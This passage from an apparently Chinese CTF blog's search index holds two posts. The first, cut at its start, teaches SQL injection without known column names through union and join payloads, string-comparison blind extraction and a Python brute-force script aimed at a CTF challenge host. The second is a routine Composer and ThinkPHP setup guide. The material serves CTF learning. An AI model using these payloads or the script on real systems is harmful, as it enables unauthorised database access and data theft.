a;</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">+------+</span><br><span class="line">| 1    |</span><br><span class="line">| Tom  |</span><br><span class="line">| Bob  |</span><br><span class="line">| Dam  |</span><br><span class="line">| Tony |</span><br><span class="line">| xi   |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select group_concat(a) from(select 1 as a,2 as b,3 as c,4 as d union select * from tp_user)as m),3&#x27;</span><br></pre></td></tr></table></figure><h3 id="利用join爆列名"><a href="#利用join爆列名" class="headerlink" title="利用join爆列名"></a>利用join爆列名</h3><p>需要有回显才能使用</p><p>由于join是将两张表的列名给加起来，所以有可能会产生相同的列名，而在使用别名时，是不允出现相同的列名的，因此当它们两个一起使用时，就会爆出相同的列名的名称，从而获得列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tp_one;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| Tom      | 123      |</span><br><span class="line">+----------+----------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tp_one union select * from (select * from tp_one as a join tp_one as b) as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;username&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tp_one union select * from (select * from tp_one as a join tp_one as b using(username)) as c;</span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;password&#x27;</span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><p>获取第一个列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union all select * from (select * from users as a join users as b)as c#</span><br></pre></td></tr></table></figure><p>获取下一个列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union all select*from (select * from users as a join users as b using(username))as c#</span><br></pre></td></tr></table></figure><h3 id="字符比较查询"><a href="#字符比较查询" class="headerlink" title="字符比较查询"></a>字符比较查询</h3><p>要知道比较两个字符串的大小与字符串的长度是没有关系的，给定两个字符串，会各取两个字符串的首字符ascii码来比较，不等式成立返回1，不等式不成立返回0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x27;g&#x27;是比&#x27;f&#x27;大的，所以返回1</span><br><span class="line">mysql&gt; select (select &#x27;g&#x27;) &gt; (select &#x27;flag&#x27;);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| (select &#x27;g&#x27;) &gt; (select &#x27;flag&#x27;) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">|                              1 |</span><br><span class="line">+--------------------------------+</span><br><span class="line"></span><br><span class="line">当相等或者小于时，就会返回0</span><br><span class="line">mysql&gt; select (select &#x27;f&#x27;) &gt; (select &#x27;flag&#x27;);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| (select &#x27;f&#x27;) &gt; (select &#x27;flag&#x27;) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">|                              0 |</span><br><span class="line">+--------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select &#x27;d&#x27;) &gt; (select &#x27;flag&#x27;);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| (select &#x27;d&#x27;) &gt; (select &#x27;flag&#x27;) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">|                              0 |</span><br><span class="line">+--------------------------------+</span><br></pre></td></tr></table></figure><p>利用这个特性，就可以逐字符爆破数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select &#x27;fm&#x27;) &gt; (select &#x27;flag&#x27;);</span><br><span class="line">+---------------------------------+</span><br><span class="line">| (select &#x27;fm&#x27;) &gt; (select &#x27;flag&#x27;) |</span><br><span class="line">+---------------------------------+</span><br><span class="line">|                               1 |</span><br><span class="line">+---------------------------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select &#x27;fl&#x27;) &gt; (select &#x27;flag&#x27;);</span><br><span class="line">+---------------------------------+</span><br><span class="line">| (select &#x27;fl&#x27;) &gt; (select &#x27;flag&#x27;) |</span><br><span class="line">+---------------------------------+</span><br><span class="line">|                               0 |</span><br><span class="line">+---------------------------------+</span><br></pre></td></tr></table></figure><p>因为在<strong>相等</strong>时返回<strong>0</strong>，所以在进行爆破时，我们爆破出来的<strong>1</strong>的时候，是比正确字符要<strong>大1</strong>的，所以在编写脚本时，我们要**-1**才能得到正确字符。</p><p>所以我们在设置循环上限时ascii值要大于或者等于<strong>127</strong></p><p><img src="https://img-blog.csdnimg.cn/010a3d165be443bebe8e9c49885e9f2d.png" alt="在这里插入图片描述"></p><p>脚本如下：([GYCTF2020]Ezsqli)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://e0e4d9bf-1f0b-435c-aedf-6d1aa33856ce.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        hexchar=flag+<span class="built_in">chr</span>(j)</span><br><span class="line">        payload = <span class="string">&#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data=&#123;<span class="string">&#x27;id&#x27;</span>:payload&#125;</span><br><span class="line">        re=requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 一些姿势总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无列名注入 </tag>
            
            <tag> 姿势总结 </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows下phpstudy安装composer及其thinkphp各版本</title>
      <link href="/2021/11/26/Windows%E4%B8%8Bphpstudy%E5%AE%89%E8%A3%85composer%E5%8F%8A%E5%85%B6thinkphp%E5%90%84%E7%89%88%E6%9C%AC/"/>
      <url>/2021/11/26/Windows%E4%B8%8Bphpstudy%E5%AE%89%E8%A3%85composer%E5%8F%8A%E5%85%B6thinkphp%E5%90%84%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>学习thinphp，在搭建环境是遇到了一些问题，故此写下。</p><h2 id="缘由："><a href="#缘由：" class="headerlink" title="缘由："></a>缘由：</h2><p>由于官网上thinkphp版本只提供到5.0.24 ，而需要下载的版本为5.1及其以上版本</p><p><img src="https://img-blog.csdnimg.cn/3012b801aea94e95809f73d32284aea0.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="一、composer的下载安装"><a href="#一、composer的下载安装" class="headerlink" title="一、composer的下载安装"></a>一、composer的下载安装</h2><p>我们需要利用<strong>composer</strong>来安装<strong>thinkphp</strong>高版本</p><p><img src="https://img-blog.csdnimg.cn/da4f2780b3004b54a8422e423fa1dcf6.png" alt="在这里插入图片描述"></p><p>来到phpstudy<strong>网站</strong>界面，直接点击composer即可下载</p><p>下载之后，但是注意，这里下载的是<strong>1.8.5</strong>版本的composer</p><p><img src="https://img-blog.csdnimg.cn/88e77dff8c25486ab169dc7b4d9cfb99.png" alt="在这里插入图片描述"></p><p>所以下载完之后，利用以下命令来升级composer</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer selfupdate</span><br></pre></td></tr></table></figure><h2 id="二、利用composer安装thinkphp"><a href="#二、利用composer安装thinkphp" class="headerlink" title="二、利用composer安装thinkphp"></a>二、利用composer安装thinkphp</h2><p>打开composer官网：<a href="https://www.phpcomposer.com/">Composer 中文网</a>，点击<a href="https://packagist.org/">Packagist 英文官网</a>，找到你要下载的版本</p><p><img src="https://img-blog.csdnimg.cn/5277d1b7e7a5429c975382022f8a0c32.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_12,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>复制以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/ccf6dc84a19a4431b2ad8ca330872edc.png" alt="在这里插入图片描述"></p><p>在命令行中键入以下命令即可安装成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=(输入你想要下载的版本) tp5.1(文件夹的名称)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/a1948438363645a7ab952b5e218dffd3.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>成功后会在网站根目录下生成一个文件夹tp5.1</p><p><img src="https://img-blog.csdnimg.cn/bc13502962ee4d1e90aabed03580724c.png" alt="在这里插入图片描述"></p><p>之后访问便可</p><p><img src="https://img-blog.csdnimg.cn/6031cfab5f404e48a2db35c1e6258760.png?x-os-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 软件安装及环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安装 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
